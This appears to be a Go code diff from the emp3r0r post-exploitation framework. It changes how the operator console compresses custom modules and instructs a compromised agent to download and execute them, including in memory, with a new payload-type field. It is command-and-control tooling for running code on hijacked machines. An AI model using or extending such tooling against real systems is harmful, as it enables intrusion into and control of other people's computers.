@@ -7,11 +7,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/google/uuid"
+	"github.com/jm33-m0/arc"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -63,7 +65,7 @@ func moduleCustom() {
 			download_addr = download_url_opt.Val
 		}
 
-		exec_cmd, envStr, err := genModStartCmd(&config)
+		payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
 		if err != nil {
 			CliPrintError("Parsing module config: %v", err)
 			return
@@ -76,7 +78,26 @@ func moduleCustom() {
 		// in-memory module
 		// TODO: handle different scripting languages
 		if config.InMemory {
-			cmd := fmt.Sprintf("%s --mod_name %s --in_mem --download_addr %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, download_addr)
+			file_to_download := WWWRoot + CurrentMod + ".xz"
+			CliPrintInfo("Compressing %s with xz...", CurrentMod)
+			path := fmt.Sprintf("%s/%s/%s", config.Path, CurrentMod, config.Exec)
+			data, err := os.ReadFile(path)
+			if err != nil {
+				CliPrintError("Reading %s: %v", path, err)
+				return
+			}
+			compressedBytes, err := arc.CompressXz(data)
+			if err != nil {
+				CliPrintError("Compressing %s: %v", path, err)
+				return
+			}
+			err = os.WriteFile(file_to_download, compressedBytes, 0o600)
+			if err != nil {
+				CliPrintError("Writing %s: %v", file_to_download, err)
+				return
+			}
+			cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --in_mem --download_addr %s",
+				emp3r0r_data.C2CmdCustomModule, CurrentMod, payload_type, file_to_download, download_addr)
 			cmd_id := uuid.NewString()
 			err = SendCmdToCurrentTarget(cmd, cmd_id)
 			if err != nil {
@@ -86,26 +107,27 @@ func moduleCustom() {
 		}
 
 		// compress module files
-		tarball := WWWRoot + CurrentMod + ".tar.xz"
-		if !util.IsFileExist(tarball) {
-			CliPrintInfo("Compressing %s with xz...", CurrentMod)
+		tarball_path := WWWRoot + CurrentMod + ".tar.xz"
+		file_to_download := filepath.Base(tarball_path)
+		if !util.IsFileExist(tarball_path) {
+			CliPrintInfo("Compressing %s with tar.xz...", CurrentMod)
 			path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
-			err = util.TarXZ(path, tarball)
+			err = util.TarXZ(path, tarball_path)
 			if err != nil {
 				CliPrintError("Compressing %s: %v", CurrentMod, err)
 				return
 			}
 			CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
-				float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)
+				float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
 		} else {
-			CliPrintInfo("Using cached %s", tarball)
+			CliPrintInfo("Using cached %s", tarball_path)
 		}
 
 		// tell agent to download and execute this module
-		checksum := tun.SHA256SumFile(tarball)
-		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --exec \"%s\"",
+		checksum := tun.SHA256SumFile(tarball_path)
+		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
 			emp3r0r_data.C2CmdCustomModule,
-			CurrentMod, checksum, envStr, download_addr, exec_cmd)
+			CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
 		cmd_id := uuid.NewString()
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
@@ -277,8 +299,9 @@ func readModCondig(file string) (pconfig *emp3r0r_data.ModConfig, err error) {
 }
 
 // genModStartCmd reads config.json of a module and generates env string (VAR=value,VAR2=value2 ...)
-func genModStartCmd(config *emp3r0r_data.ModConfig) (exec_path, envStr string, err error) {
+func genModStartCmd(config *emp3r0r_data.ModConfig) (payload_type, exec_path, envStr string, err error) {
 	exec_path = config.Exec
+	payload_type = config.Type
 	var builder strings.Builder
 
 	setEnvVar := func(opt, value string) {
